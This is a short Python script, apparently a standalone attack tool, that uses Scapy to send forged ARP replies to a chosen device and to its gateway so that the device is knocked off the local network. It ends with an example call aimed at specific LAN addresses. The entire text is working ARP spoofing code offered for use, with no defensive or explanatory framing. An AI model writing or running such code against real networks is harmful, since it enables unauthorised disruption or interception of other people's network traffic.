from scapy.all import ARP, Ether, send

def disconnect_mac(target_ip, target_mac, gateway_ip, gateway_mac):
    """Send spoofed ARP packets to disrupt a specific MAC address."""
    print(f"Targeting MAC: {target_mac} ({target_ip})")
    print(f"Gateway MAC: {gateway_mac} ({gateway_ip})")

    # ARP reply to Target (Making it think we are Router)
    spoof_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

    # ARP reply to Router (Making it think we are the Target)
    spoof_router = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Send both packets multiple times
    send(spoof_target, count=5, verbose=False)
    send(spoof_router, count=5, verbose=False)

    print(f"Sent ARP spoofing packets to disconnect MAC {target_mac} ({target_ip})")

# Example usage
disconnect_mac(
    target_ip="192.168.3.45", 
    target_mac="E8:6A:64:67:92:A7",  
    gateway_ip="192.168.3.1",
    gateway_mac="D4:BB:E6:84:C0:C2"
)
